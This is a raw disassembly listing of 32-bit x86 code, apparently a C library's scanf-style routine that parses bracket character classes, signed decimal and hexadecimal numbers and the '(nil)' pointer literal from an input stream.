cmp bl, 0x5d
jne 0x80703b9
test bl, bl
je case.0x806fb57.38
test byte [var_a4h], 1
je 0x8070708
xor esi, esi
mov edi, dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x806f912
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80706f5
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch], 0xffffffff
je 0x80706e3
inc dword [var_98h_2]
cmp dword [var_9ch], 0xffffffff
je 0x806f8c6
mov dword [var_88h], 0
mov dword [var_84h], 0
mov eax, dword [var_ech]
mov edx, dword [var_9ch]
movzx ecx, byte [var_b8h]
cmp byte [edx + eax], cl
je 0x80706c2
test byte [var_a4h], 8
je 0x80705aa
dec dword [var_a0h_2]
mov eax, dword [var_a0h_2]
test eax, eax
jle 0x80704ef
cmp dword [var_9ch], 0xffffffff
je 0x8070598
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8070585
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8070573
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
jne 0x807046a
test esi, esi
jne 0x806fd03
cmp edi, dword [var_98h]
je case.0x806fb57.38
test byte [var_a4h], 8
jne 0x806f69c
mov eax, dword [var_d8h]
mov dword [eax], 0
add eax, 4
test dword [var_a4h], 0x100
mov dword [var_d8h], eax
je 0x806fdb2
mov ecx, dword [var_dch]
mov edx, eax
sub edx, dword [ecx]
mov eax, edx
sar eax, 2
cmp eax, dword [var_e0h]
je 0x806fdb2
mov dword [var_4h], edx
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
je 0x806fdb2
mov edx, dword [var_dch]
mov dword [edx], eax
jmp 0x806fdb2
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80704e2
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80704cf
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x80704ef
lea eax, [var_5ch]
lea ecx, [var_88h]
mov byte [var_5ch], dl
mov dword [var_4h], eax
mov dword [var_sp_ch], ecx
mov dword [var_8h], 1
mov eax, dword [var_d8h]
mov dword [esp], eax
call fcn.08077900
cmp eax, 0xfffffffe
je 0x8070695
xor esi, esi
add dword [var_d8h_2], 4
test dword [var_a4h_2], 0x100
je 0x8070493
mov ecx, dword [var_dch_2]
mov ebx, dword [var_e0h_2]
mov eax, dword [ecx]
shl ebx, 2
add eax, ebx
cmp dword [var_d8h_2], eax
jne 0x8070493
mov eax, dword [var_e0h_2]
shl eax, 3
mov dword [var_4h], eax
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h_2], eax
je 0x8070657
mov edx, dword [var_d8h_2]
mov eax, dword [var_dch_2]
shl dword [var_e0h_2], 1
mov dword [eax], edx
add edx, ebx
mov dword [var_d8h_2], edx
jmp 0x8070493
mov edx, dword [var_dch_2]
lea eax, [ebx + 4]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h_2], eax
je 0x80701be
add dword [var_d8h_2], ebx
inc dword [var_e0h_2]
mov ecx, dword [var_dch_2]
mov dword [ecx], eax
jmp 0x8070493
mov edx, 0
inc esi
test edx, edx
je 0x80706bb
mov dword [esp], 3
call section.
mov eax, dword [eax]
cmp esi, dword [eax + 0x58]
jb 0x80704a3
jmp 0x80744c1
mov eax, dword [0x80a9ab4]
jmp 0x80706ab
movzx eax, byte [var_9ch]
dec dword [var_98h]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e190
jmp 0x80704ef
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070449
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070436
cmp dword [var_9ch], 0xffffffff
mov esi, dword [var_98h]
je 0x807094e
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807093b
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8070929
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x806f8c6
mov eax, dword [var_ech]
mov edx, dword [var_9ch]
movzx ecx, byte [var_b8h]
cmp byte [edx + eax], cl
je 0x8070908
test byte [var_a4h], 8
jne 0x80707b0
mov ecx, dword [var_d4h]
mov byte [ecx], dl
inc ecx
test dword [var_a4h], 0x100
mov dword [var_d4h], ecx
je 0x80707b0
mov edx, dword [var_dch]
mov eax, dword [var_e0h]
add eax, dword [edx]
cmp ecx, eax
je 0x8070894
dec dword [var_a0h]
mov ebx, dword [var_a0h]
test ebx, ebx
jle 0x8070808
cmp dword [var_9ch], 0xffffffff
je 0x8070882
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807086f
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8070860
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x807075a
cmp esi, dword [var_98h]
je case.0x806fb57.38
test byte [var_a4h], 8
jne 0x806f69c
mov ecx, dword [var_d4h]
mov byte [ecx], 0
inc ecx
test dword [var_a4h], 0x100
mov dword [var_d4h], ecx
je 0x806fdb2
mov edx, dword [var_dch]
mov eax, ecx
sub eax, dword [edx]
cmp eax, dword [var_e0h]
je 0x806fdb2
mov dword [var_4h], eax
jmp 0x80700cd
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x80707fb
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80707ec
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8070808
mov ebx, dword [var_e0h]
add ebx, ebx
mov ecx, dword [var_dch]
mov dword [var_4h], ebx
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d4h], eax
jne 0x80708e1
mov eax, dword [var_e0h]
inc eax
cmp ebx, eax
jbe 0x80708c9
mov ebx, eax
jmp 0x807089c
mov edx, dword [var_dch]
mov ecx, dword [var_e0h]
mov eax, dword [edx]
mov byte [ecx + eax - 1], 0
jmp 0x80701d4
mov edx, dword [var_d4h]
mov ecx, dword [var_e0h]
mov dword [var_e0h], ebx
mov eax, dword [var_dch]
mov dword [eax], edx
add edx, ecx
mov dword [var_d4h], edx
jmp 0x80707b0
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
jmp 0x8070808
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807074d
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807073a
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806f8c6
mov eax, dword [var_90h_2]
movzx ebx, byte [eax]
test bl, bl
je 0x80703c2
cmp bl, 0x5d
je 0x80703c2
movzx eax, byte [eax - 2]
cmp al, bl
ja 0x80703c2
mov edx, eax
jae 0x80703d8
mov ecx, dword [var_ech_2]
movzx eax, dl
inc edx
mov byte [eax + ecx], 1
mov eax, dword [var_90h_2]
movzx ebx, byte [eax]
cmp dl, bl
jb 0x807098e
jmp 0x80703d8
mov edx, dword [var_ech]
movzx eax, bl
mov byte [eax + edx], 1
inc dword [var_90h]
mov ecx, dword [var_90h]
movzx ebx, byte [ecx]
jmp 0x80703a4
inc ecx
mov byte [var_b8h], 1
mov dword [var_90h], ecx
jmp 0x8070328
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x80702ca
add eax, 4
dec edx
jne 0x80709f2
jmp 0x80702ca
mov ecx, dword [var_fch_2]
test ecx, ecx
jne 0x8070a1b
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
jmp 0x80702fe
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070a14
add eax, 4
dec edx
jne 0x8070a27
jmp 0x8070a14
test byte [var_a4h], 8
jne 0x8070312
test dword [var_a4h_2], 0x100
je 0x8070aba
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8070aa6
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_dch_2], eax
mov eax, dword [var_dch_2]
test eax, eax
je case.0x806fb57.38
mov dword [var_e0h_2], 0x64
mov dword [esp], 0x64
call fcn.08050fe0
mov edx, dword [var_dch_2]
mov dword [edx], eax
mov dword [var_d4h_2], eax
mov eax, dword [var_d4h_2]
test eax, eax
jmp 0x807030c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070a5f
add eax, 4
dec edx
jne 0x8070ab2
jmp 0x8070a5f
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8070ad5
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
jmp 0x8070a93
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070ad1
add eax, 4
dec edx
jne 0x8070ae1
jmp 0x8070ad1
test byte [var_a4h_2], 1
jne case.0x806fb57.67
test byte [var_a4h_2], 8
jne 0x8070b30
mov esi, dword [var_fch_2]
test esi, esi
jne 0x8070cf8
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_d4h_2], eax
mov ebx, dword [var_d4h_2]
test ebx, ebx
je case.0x806fb57.38
cmp dword [var_9ch_2], 0xffffffff
je 0x8070ce1
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8070cce
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x8070cbc
inc dword [var_98h_2]
mov eax, dword [var_9ch_2]
mov dword [var_9ch_2], eax
inc eax
je 0x806f8c6
cmp dword [var_a0h_2], 0xffffffff
mov eax, 1
cmovne eax, dword [var_a0h_2]
test byte [var_a4h_2], 8
mov dword [var_a0h_2], eax
jne 0x8070c44
movzx ecx, byte [var_9ch_2]
mov eax, dword [var_d4h_2]
mov byte [eax], cl
dec dword [var_a0h_2]
inc eax
mov ecx, dword [var_a0h_2]
mov dword [var_d4h_2], eax
test ecx, ecx
jle 0x806fda5
cmp dword [var_9ch_2], 0xffffffff
je 0x8070c32
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8070c22
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x8070c13
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
jne 0x8070ba8
jmp 0x806fda5
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8070c05
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8070bf6
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
jmp 0x806fda5
dec dword [var_a0h_2]
mov edx, dword [var_a0h_2]
test edx, edx
jle 0x806fda5
cmp dword [var_9ch_2], 0xffffffff
je 0x806fddc
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8070cac
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x8070c9d
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
jne 0x8070c44
jmp 0x806fda5
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8070c8f
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8070c80
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8070b6f
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8070b5c
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8070b75
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070b1a
add eax, 4
dec edx
jne 0x8070d08
jmp 0x8070b1a
mov dword [var_bch_2], 0xa
mov dword [var_c0h_2], 1
cmp dword [var_9ch], 0xffffffff
je 0x8072329
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072316
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072304
inc dword [var_98h]
mov ebx, dword [var_9ch]
cmp ebx, 0xffffffff
mov dword [var_9ch], ebx
je 0x806f8c6
cmp dword [var_9ch], 0x2d
je 0x8072210
cmp dword [var_9ch], 0x2b
je 0x8072210
mov eax, dword [var_a0h]
test eax, eax
je 0x8070dac
cmp dword [var_9ch], 0x30
je 0x8071fef
mov ebx, dword [var_bch]
mov eax, 0xa
test ebx, ebx
cmovne eax, dword [var_bch]
mov dword [var_bch], eax
cmp dword [var_bch], 0xa
je 0x8071840
cmp dword [var_9ch], 0xffffffff
je 0x8070f3b
mov ebx, dword [var_a0h]
test ebx, ebx
je 0x8070f3b
cmp dword [var_bch], 0x10
je 0x807181b
mov eax, dword [var_9ch]
sub eax, 0x30
cmp eax, 9
ja 0x8070e15
cmp eax, dword [var_bch]
jl 0x8070e95
cmp dword [var_bch], 0xa
jne 0x8070f3b
test byte [var_a4h], 0x80
je 0x8070f3b
mov ecx, dword [var_c8h]
test ecx, ecx
je 0x8070f3b
mov edx, dword [var_a0h]
mov ebx, dword [var_c8h]
mov esi, 0x7fffffff
test edx, edx
movzx edx, byte [ebx]
cmovg esi, dword [var_a0h]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x80716db
mov eax, dword [var_c8h]
movzx edx, byte [eax]
test dl, dl
jne 0x8071662
mov eax, dword [var_a0h]
test eax, eax
cmovle esi, dword [var_a0h]
dec dword [var_f4h]
mov dword [var_a0h], esi
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8071604
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
cmp dword [var_9ch], 0xffffffff
mov dword [var_a0h], eax
je 0x80715ed
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80715da
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x80715c8
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x8070f3b
mov eax, dword [var_a0h]
test eax, eax
jne 0x8070dee
mov eax, dword [var_f4h]
test eax, eax
je 0x8071308
cmp dword [var_f4h], 1
je 0x80712ea
cmp dword [var_9ch], 0xffffffff
je 0x8070f7b
movzx eax, byte [var_9ch]
mov edx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], edx
mov dword [var_4h_2], eax
call fcn.0804e190
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x8071295
mov eax, dword [var_ech]
mov edx, dword [var_f4h]
mov byte [edx + eax], 0
test byte [var_a4h], 2
je 0x8071222
mov eax, dword [var_c0h]
test eax, eax
je 0x80711ef
mov eax, dword [var_a4h]
mov ecx, dword [var_bch]
and eax, 0x80
mov dword [var_8h_2], ecx
mov dword [esp + 0xc], eax
lea eax, [var_80h]
mov dword [var_4h_2], eax
mov eax, dword [var_ech]
mov dword [esp], eax
call fcn.08085000
mov dword [var_d0h], eax
mov dword [var_cch], edx
mov edx, dword [var_ech]
cmp edx, dword [var_80h]
je case.0x806fb57.38
test byte [var_a4h], 8
jne 0x806f69c
mov edi, dword [ebp - 0xc0]
test edi, edi
jne 0x807112d
test byte [ebp - 0xa4], 2
je 0x8071068
mov esi, dword [ebp - 0xfc]
test esi, esi
je 0x8071059
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8071041
add eax, 4
dec edx
jne 0x807103b
mov eax, dword [eax]
mov edx, dword [ebp - 0xd0]
mov ecx, dword [ebp - 0xcc]
mov dword [eax], edx
mov dword [eax + 4], ecx
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x8071041
test byte [ebp - 0xa4], 4
je 0x80710ac
mov ebx, dword [ebp - 0xfc]
test ebx, ebx
je 0x807109d
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807108d
add eax, 4
dec edx
jne 0x8071087
mov eax, dword [eax]
mov ecx, dword [ebp - 0xd0]
mov word [eax], cx
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x807108d
test dword [ebp - 0xa4], 0x200
jne 0x80710f2
mov ecx, dword [ebp - 0xfc]
test ecx, ecx
je 0x80710e3
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x80710d4
add eax, 4
dec edx
jne 0x80710ce
mov eax, dword [eax]
mov edx, dword [ebp - 0xd0]
mov dword [eax], edx
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x80710d4
mov edx, dword [ebp - 0xfc]
test edx, edx
je 0x807111e
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807110e
add eax, 4
dec edx
jne 0x8071108
movzx ecx, byte [ebp - 0xd0]
mov eax, dword [eax]
mov byte [eax], cl
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x807110e
test byte [ebp - 0xa4], 2
je 0x807115f
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x8071059
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8071041
add eax, 4
dec edx
jne 0x8071154
jmp 0x8071041
test byte [ebp - 0xa4], 4
je 0x8071191
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x807109d
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807108d
add eax, 4
dec edx
jne 0x8071186
jmp 0x807108d
test dword [ebp - 0xa4], 0x200
jne 0x80711c6
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x80710e3
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x80710d4
add eax, 4
dec edx
jne 0x80711bb
jmp 0x80710d4
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x807111e
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807110e
add eax, 4
dec edx
jne 0x80711e4
jmp 0x807110e
mov eax, dword [var_a4h]
mov edx, dword [var_bch]
mov ecx, dword [var_ech]
and eax, 0x80
mov dword [var_8h_2], edx
mov dword [esp + 0xc], eax
mov dword [esp], ecx
lea eax, [var_80h]
mov dword [var_4h_2], eax
call fcn.080850c0
jmp 0x8070fe6
mov eax, dword [var_c0h]
test eax, eax
je 0x8071265
mov eax, dword [var_a4h]
mov edx, dword [var_ech]
and eax, 0x80
mov dword [esp], edx
mov dword [esp + 0xc], eax
mov eax, dword [var_bch]
mov dword [var_8h_2], eax
lea eax, [var_80h]
mov dword [var_4h_2], eax
call fcn.080494c0
mov dword [var_d0h], eax
jmp 0x8070ff2
mov eax, dword [var_a4h]
mov ecx, dword [var_bch]
and eax, 0x80
mov dword [var_8h_2], ecx
mov dword [esp + 0xc], eax
lea eax, [var_80h]
mov dword [var_4h_2], eax
mov eax, dword [var_ech]
mov dword [esp], eax
call fcn.08063780
jmp 0x807125a
add ecx, ecx
mov eax, 0x100
mov edx, dword [var_ech]
cmp ecx, 0xff
cmova eax, ecx
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [var_1fh]
and eax, 0xfffffff0
test edx, edx
mov dword [var_ech], eax
je 0x8070f8d
mov ecx, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], eax
mov dword [var_8h_2], ecx
call fcn.08053770
jmp 0x8070f8d
mov edx, dword [var_ech]
movzx eax, byte [edx]
cmp al, 0x2b
je 0x806f898
cmp al, 0x2d
jne 0x8070f56
jmp 0x806f898
mov eax, dword [var_e8h]
test eax, eax
je 0x806f898
cmp dword [var_9ch], 0x28
jne 0x806f898
mov edx, dword [arg_8h]
mov ecx, dword [var_ach]
mov eax, dword [edx + 4]
mov ebx, dword [ecx + 0x38]
cmp eax, dword [edx + 8]
jae 0x80715b5
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x80715a3
inc dword [var_98h]
movzx eax, byte [var_9ch]
cmp dword [ebx + eax*4], 0x6e
jne 0x806f898
cmp dword [var_9ch], 0xffffffff
mov ecx, dword [var_ach]
mov ebx, dword [ecx + 0x38]
je 0x807158b
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071578
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8071566
inc dword [ebp - 0x98]
movzx eax, byte [ebp - 0x9c]
lea eax, [ebx + eax*4]
cmp dword [eax], 0x69
jne 0x806f898
cmp dword [ebp - 0x9c], 0xffffffff
mov eax, dword [ebp - 0xac]
mov ebx, dword [eax + 0x38]
je 0x807154e
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807153b
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071529
inc dword [ebp - 0x98]
movzx eax, byte [ebp - 0x9c]
lea eax, [ebx + eax*4]
cmp dword [eax], 0x6c
jne 0x806f898
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071517
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071504
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80714f2
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0x29
jne 0x806f898
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x807149b
mov ecx, dword [ebp - 0xf4]
mov edx, dword [ebp - 0xec]
mov byte [ecx + edx], 0x30
inc ecx
mov dword [ebp - 0xf4], ecx
jmp 0x8070f7b
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x807147f
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x807147f
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071464
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071451
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x806f898
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071412
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x80713ff
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
lea eax, [ebx + 0x3fc]
jmp 0x807141c
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80713b7
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80713a4
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
lea eax, [ebx + 0x3fc]
jmp 0x80713c1
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807135e
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807134b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070f1e
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070f0b
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8070f24
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x8070ea7
mov eax, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], ecx
mov dword [var_8h_2], eax
call fcn.08053770
jmp 0x8070ea7
cmp ebx, dword [var_c8h]
jbe 0x8070f3b
mov eax, ebx
sub eax, dword [var_c8h]
sub dword [var_f4h], eax
cmp dword [var_9ch], 0xffffffff
je 0x80716a1
movzx eax, byte [ebp - 0x9c]
mov edx, dword [ebp + 8]
dec dword [ebp - 0x98]
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804e190
dec ebx
cmp ebx, dword [ebp - 0xc8]
ja 0x80716b8
movzx ebx, byte [ebx]
mov dword [ebp - 0x9c], ebx
jmp 0x8070f3b
dec dword [ebp - 0x98]
mov ecx, dword [ebp + 8]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804e190
cmp ebx, dword [ebp - 0xc8]
ja 0x80716b8
jmp 0x80716aa
test esi, esi
jle 0x8070e72
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80717bd
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
inc ebx
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
cmp byte [ebx], 0
je 0x8070e7a
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80717a9
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071799
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807178a
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8071782
movzx edx, byte [ebx]
dec esi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x8070e72
test esi, esi
jg 0x80716e3
jmp 0x8070e72
movzx edx, byte [ebx]
jmp 0x8070e72
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071753
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071744
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071759
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x80716f5
mov eax, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], ecx
mov dword [var_8h_2], eax
call fcn.08053770
jmp 0x80716f5
mov edx, dword [var_ach]
mov ecx, dword [var_9ch]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x10
jne 0x8070e95
jmp 0x8070f3b
lea esi, [esi]
test dword [var_a4h], 0x400
je 0x8070dd3
mov eax, dword [var_b0h]
mov dword [var_100h], 0
mov edx, dword [eax + 0x70]
dec edx
cmp dword [var_9ch], 0xffffffff
mov dword [var_104h], edx
je 0x8070f3b
mov ecx, dword [var_a0h]
test ecx, ecx
je 0x8070f3b
mov dword [var_108h], 0
mov edx, dword [var_a0h]
mov ecx, dword [var_108h]
mov edi, 0x7fffffff
test edx, edx
mov edx, dword [var_b0h]
cmovg edi, dword [var_a0h]
